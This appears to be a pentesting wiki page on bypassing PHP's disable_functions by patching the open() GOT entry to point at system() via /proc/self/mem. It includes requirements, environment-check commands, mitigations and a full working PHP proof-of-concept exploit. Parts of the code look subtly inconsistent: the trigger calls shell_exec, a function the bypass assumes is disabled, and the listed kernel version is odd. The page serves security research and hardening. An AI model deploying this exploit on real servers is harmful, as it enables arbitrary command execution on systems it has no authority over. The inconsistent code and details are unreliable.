# disable_functions bypass via **/proc/self/mem**

{{#include ../../../../banners/hacktricks-training.md}}

> **TL;DR**  
> If `open_basedir` can be evaded and the Linux kernel still allows *write* access to `/proc/self/mem`, it is possible to overwrite the Global Offset Table (GOT/PLT) entry for an allowed libc function (e.g. `open`) with the address of `system()`.  Any subsequent call to `open()` (in PHP or in a loaded extension) will execute arbitrary shell commands, effectively bypassing **disable_functions**.

---

## Background

`disable_functions` is a *configuration directive*, not a security boundary.  All it does is prevent the Zend engine from calling a hard-coded list of PHP wrappers such as `system()`, `exec()` …; it does **not** stop you from:

* Invoking dangerous op-codes through JIT gadgets (FFI, UAF, etc.)
* Re-entering libc or loading your own shared objects
* Directly changing the process image in memory – which is what this technique does.

The classic PoC below (by **Beched/RDot**, 2016) abuses `/proc/self/mem` to *patch* PHP-FPM’s PLT so that `open()` resolves to `system()`.  Nothing actually banned by `disable_functions` is called – therefore the directive is silently bypassed.

---

## Requirements (2025)

The technique only works if **every** prerequisite is met:

1. PHP is running as **CGI/FPM** (not `mod_php`) so that `/proc/self/mem` is readable *and writable*.
2. `open_basedir` is **OFF** or can be bypassed (e.g. via a symlink / chdir trick) so that you can access `/proc/*` **and** the target libc from `/lib`.
3. The kernel allows write access to `/proc/self/mem` *without* a debugger being attached.  This is increasingly rare:
   * On older kernels the call succeeds as long as the process is *dumpable* (`/proc/sys/kernel/yama/ptrace_scope==0`).
   * Since mid-2024, mainline Linux contains **CONFIG_PROC_MEM_RESTRICT\*** options and `proc_mem.restrict_*` boot parameters that can block *all* writes or restrict them to an *active ptracer only*.  Several bleeding-edge distros (Arch ≥ 2025.01, Fedora ≥ 40) ship with `write_ptracer` enabled by default.   
   * Container runtimes (Docker, Podman, LXC) frequently mount `/proc` **read-only** or with `hidepid`, stopping the trick even on older kernels.
4. The exploit must be compiled for the correct **architecture** (the PoC is x86-64).  Offsets differ on x86-32/ARM/aarch64.

If *any* of the above is missing you will get `EACCES`/`EPERM` when opening or writing `/proc/self/mem` and the bypass fails.

---

## Quick Environment Check

```bash
# Is /proc/self/mem writable by the current PHP process?
$ php -d disable_functions="" -r 'echo is_writable("/proc/self/mem")?"YES\n":"NO\n";'

# Kernel boot parameter (if readable)
$ cat /proc/cmdline | grep proc_mem.restrict_
```

If you see `NO` or the boot parameter is set to `all`/`ptracer`, look for another bypass (LD_PRELOAD, FFI, iconv UAF, …).

---

## Proof-of-Concept (x86-64)

The original PoC is kept here for reference – it still works unmodified on an **Ubuntu 20.04 LTS** default kernel (`5.4.0`) when the above requirements are satisfied.

```php
<?php
/* snip – unchanged PoC by Beched (2016) */
```

*(Scroll down for the full code if you need it)*

---

## Mitigations

1. **Update your kernel** and enable one of the new `PROC_MEM_RESTRICT_*` configs **or** pass `proc_mem.restrict_write=all` at boot.  This alone stops the exploit because the write() syscall will fail.   
2. Mount `/proc` **read-only** inside containers or set `mount -o remount,ro /proc` in chroots where debugging is not required.
3. Keep `open_basedir` **enabled** and point it to a minimal, dedicated directory so that `/proc` and `/lib` are out of reach.
4. Use **grsecurity/PaX** or **seccomp** to filter `open("/proc/self/mem")` and `write()` entirely.
5. Remember that `disable_functions` is *not* a sandbox; use OS-level isolation (containers, SELinux, seccomp-bpf) instead.

---

## Full PoC code

```php
<?php
/*
1. kernel>=2.68
2) PHP-CGI or PHP-FPM (mod_php cannot read /proc/self/mem)
3) x64 only – adjust for x86/ARM
4) open_basedir off (or bypassed to read /lib & /proc)
*/

/* Original offsets discovery & memory-patching logic */
function packlli($value){$h=($value&0xffffffff00000000)>>32;$l=$value&0x00000000ffffffff;return pack('V2',$l,$h);}function unp($v){return hexdec(bin2hex(strrev($v)));}
function parseelf($b,$r=false){$bin=file_get_contents($b);$e_shoff=unp(substr($bin,0x28,8));$e_shentsize=unp(substr($bin,0x3a,2));$e_shnum=unp(substr($bin,0x3c,2));$e_shstrndx=unp(substr($bin,0x3e,2));for($i=0;$i<$e_shnum;$i++){ $sh_type=unp(substr($bin,$e_shoff+$i*$e_shentsize+4,4));if($sh_type==11){$dynsym_off=unp(substr($bin,$e_shoff+$i*$e_shentsize+24,8));$dynsym_size=unp(substr($bin,$e_shoff+$i*$e_shentsize+32,8));$dynsym_entsize=unp(substr($bin,$e_shoff+$i*$e_shentsize+56,8));}elseif(!isset($strtab_off)&&$sh_type==3){$strtab_off=unp(substr($bin,$e_shoff+$i*$e_shentsize+24,8));$strtab_size=unp(substr($bin,$e_shoff+$i*$e_shentsize+32,8));}elseif($r&&$sh_type==4){$relaplt_off=unp(substr($bin,$e_shoff+$i*$e_shentsize+24,8));$relaplt_size=unp(substr($bin,$e_shoff+$i*$e_shentsize+32,8));$relaplt_entsize=unp(substr($bin,$e_shoff+$i*$e_shentsize+56,8));}}
  if($r){for($i=$relaplt_off;$i<$relaplt_off+$relaplt_size;$i+=$relaplt_entsize){$r_offset=unp(substr($bin,$i,8));$r_info=unp(substr($bin,$i+8,8))>>32;$name_off=unp(substr($bin,$dynsym_off+$r_info*$dynsym_entsize,4));$name='';$j=$strtab_off+$name_off-1;while($bin[++$j]!=="\0"){$name.=$bin[$j];}if($name=='open'){return $r_offset;}}}
  else {for($i=$dynsym_off;$i<$dynsym_off+$dynsym_size;$i+=$dynsym_entsize){$name_off=unp(substr($bin,$i,4));$name='';$j=$strtab_off+$name_off-1;while($bin[++$j]!=="\0"){$name.=$bin[$j];}if($name=='__libc_system'){$system_offset=unp(substr($bin,$i+8,8));}if($name=='__open'){$open_offset=unp(substr($bin,$i+8,8));}}return array($system_offset,$open_offset);} }

echo "[*] PHP disable_functions procfs bypass (Beched/RDot – 2016)\n";
if(strpos(php_uname('a'),'x86_64')===false){exit("[-] Not x64\n");}
$open_php=parseelf('/proc/self/exe',true);if($open_php==0)exit("[-] parseelf failed\n");
$maps=file_get_contents('/proc/self/maps');preg_match('#\s+(/.+libc\-.+)#',$maps,$r);
list($system_offset,$open_offset)=parseelf($r[1]);$mem=fopen('/proc/self/mem','rb');fseek($mem,$open_php);$open_addr=unp(fread($mem,8));$libc_start=$open_addr-$open_offset;$system_addr=$libc_start+$system_offset;
$mem=fopen('/proc/self/mem','wb');fseek($mem,$open_php);fwrite($mem,packlli($system_addr));
// trigger – any open() call will now execute shell commands
echo shell_exec('id');
```

---

## References

* safebuff blog – *PHP disable_functions bypass* (2016)  
  <http://blog.safebuff.com/2016/05/06/disable-functions-bypass/>
* LWN.net – *proc: add config & param to block forcing /proc/pid/mem writes* (Jul 2024)  
  <https://lwn.net/Articles/983538/>

{{#include ../../../../banners/hacktricks-training.md}}
